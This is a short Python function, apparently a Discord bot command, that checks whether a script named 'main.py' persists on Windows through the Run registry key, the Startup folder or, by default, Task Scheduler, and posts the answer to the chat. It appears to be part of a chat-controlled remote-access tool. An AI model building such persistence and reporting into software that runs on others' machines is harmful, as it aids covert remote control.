import os
import winreg

async def check_persistence_method(ctx):
    # 1. Check the Startup Registry Path
    registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    persistence_type = "Task Scheduler"  # Default if no other method is found

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_READ) as key:
            i = 0
            while True:
                try:
                    value_name, value_data, _ = winreg.EnumValue(key, i)
                    if "main.py" in value_data:
                        persistence_type = "Registry"
                        break
                    i += 1
                except OSError:
                    break
    except Exception as e:
        await ctx.send(f"**Registry Check Failed:** {str(e)}")

    # 2. Check the Startup Folder
    startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
    for file_name in os.listdir(startup_folder):
        if "main.py" in file_name:
            persistence_type = "Startup Folder"
            break

    # Send the persistence type
    await ctx.send(f"**Persistence Type:** {persistence_type}")
